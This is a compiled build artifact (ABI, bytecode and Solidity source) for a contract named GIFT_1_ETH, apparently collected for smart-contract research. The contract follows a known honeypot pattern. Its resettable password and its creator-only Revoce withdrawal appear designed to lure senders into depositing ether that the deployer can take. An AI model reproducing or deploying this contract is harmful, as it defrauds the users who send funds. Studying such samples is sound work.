{
  "contractName": "GIFT_1_ETH",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "hashPass",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "SetPass",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Revoce",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260008060006101000a81548160ff02191690831515021790555034801561002a57600080fd5b506104dc8061003a6000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630a6fbb051461007a578063181ffc5f1461009e57806331fd725a146100cc57806387f24484146100fd578063b456ecc514610130578063cd8b02c8146101b5575b005b61009c60048036038101908080356000191690602001909291905050506101bf565b005b6100ca60048036038101908080359060200190820180359060200191909192939192939050505061024b565b005b3480156100d857600080fd5b506100fb60048036038101908080356000191690602001909291905050506102dc565b005b34801561010957600080fd5b50610112610365565b60405180826000191660001916815260200191505060405180910390f35b34801561013c57600080fd5b50610197600480360381019080803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061036b565b60405180826000191660001916815260200191505060405180910390f35b6101bd6103d7565b005b6000809054906101000a900460ff161580156101e25750670de0b6b3a764000034115b806101f65750600060010260015460001916145b1561024857806001816000191690555033600060016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b8181604051808383808284378201915050925050506040518091039020600019166001546000191614156102d8573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102d6573d6000803e3d6000fd5b505b5050565b600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480156103425750600154600019168160001916145b156103625760016000806101000a81548160ff0219169083151502179055505b50565b60015481565b6000816040518082805190602001908083835b6020831015156103a3578051825260208201915060208101905060208303925061037e565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390209050919050565b600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156104ae57600060019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156104ac573d6000803e3d6000fd5b505b5600a165627a7a72305820f312c9f2df0ee04283ce48d015ac75806cd1bab4137b67f24438bb423445355e0029",
  "source": "\n\ncontract GIFT_1_ETH\n{\n    bool passHasBeenSet = false;\n    \n    address sender;\n    \n    bytes32 public hashPass;\n\t\n\tfunction() public payable{}\n    \n    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )\n        {\n            hashPass = hash;\n            sender = msg.sender;\n        }\n    }\n    \n    function GetGift(bytes pass)\n    external\n    payable\n    {\n        if(hashPass == sha3(pass))\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    function Revoce()\n    public\n    payable\n    {\n        if(msg.sender==sender)\n        {\n            sender.transfer(this.balance);\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(msg.sender==sender&&hash==hashPass)\n        {\n           passHasBeenSet=true;\n        }\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x3597f78c7872db259ce023acc34511c7a79f42e3/contracts/0x3597f78c7872db259ce023acc34511c7a79f42e3.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:51:56.811Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}